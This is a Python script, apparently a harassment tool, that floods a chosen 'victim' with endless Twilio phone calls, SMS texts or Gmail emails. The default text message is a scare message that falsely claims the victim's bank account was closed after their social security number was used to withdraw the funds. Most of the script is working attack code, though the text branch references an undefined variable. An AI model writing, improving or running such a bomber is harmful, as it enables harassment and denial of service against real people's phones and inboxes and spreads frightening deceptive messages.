import time
from twilio.rest import Client
import smtplib
import os
os.system("clear")
sid = '' #Fill in with your Twilio SID
token = '' #Fill in with your Twilio Token
email = ""
theirEmail = ""
password = ""
client = Client(sid, token)
number = "" #Put your Twilio number here
def call(victimNumber, yourNumber):
	try:
		call = client.calls.create(
			to = victimNumber,
			from_ = yourNumber,
			url = 'http://demo.twilio.com/docs/voice.xml',
			method = "GET",
		)
		print("Started call to %s from %s" % (victimNumber, yourNumber));
	except Exception as err:
		print("Error on %s from %s: %s" % (victimNumber, yourNumber, err));
def text(victimNumber, yourNumber):
	try:
		message = client.messages \
			.create(
				body='Your bank account has been successfully closed. The social security number you used to open the account has been used to withdraw the remainder of the funds and close the account. Thank you for banking with us!', #You can change this string for a different message if you would like!
				from_ = yourNumber,
				to = victimNumber
			)
		print("Texted %s from %s" % (victimNumber, yourNumber));
	except Exception as err:
		print("Error on %s from %s: %s" % (victimNumber, yourNumber, err));
def email():
	s = smtplib.SMTP('smtp.gmail.com', 587)
	s.starttls()
	s.login(yourEmail, yourPassword)
	s.sendmail(yourEmail, theirEmail, msg)
print ("""\033[94m
                                                    
                                                    
 .oooo.o oo.ooooo.   .ooooo.   .ooooo.  ooo. .oo.   
d88(  "8  888' `88b d88' `88b d88' `88b `888P"Y88b  
`"Y88b.   888   888 888   888 888   888  888   888  
o.  )88b  888   888 888   888 888   888  888   888  
8""888P'  888bod8P' `Y8bod8P' `Y8bod8P' o888o o888o 
          888                                       
         o888o                                      
                                                                                        
""")
times = 0
choice = input("\033[93m Would you like to Call, Text or Email bomb them?: ").lower()
if choice == "call":
	victim = input("\033[93m What number would you like to flood? +1 MUST BE IN FRONT: ")
	while True:
		times += 1
		print("\033[92m Starting flood on %s,  %s times!" % (victim, times))
		call(victim, number)
		time.sleep(5)

elif choice == "text":
	while True:
		times +=1
		print("\033[92m Starting flood on %s, %s times!" % (victim, times))
		text(victim, number)
		time.sleep(2)
elif choice == "email":
	yourEmail = input("\033[94mWhat is your email address? ")
	theirEmail = input("\033[94mWhat is the victims email address? ")
	yourPassword = input("\033[94mWhat is your email password? ")
	msg = input("\033[94mWhat is the message you'd like to send? ")
	while True:
		times +=1
		print("\033[92m Starting flood on %s %s times!" % (theirEmail, times))
		email()
		time.sleep(5)

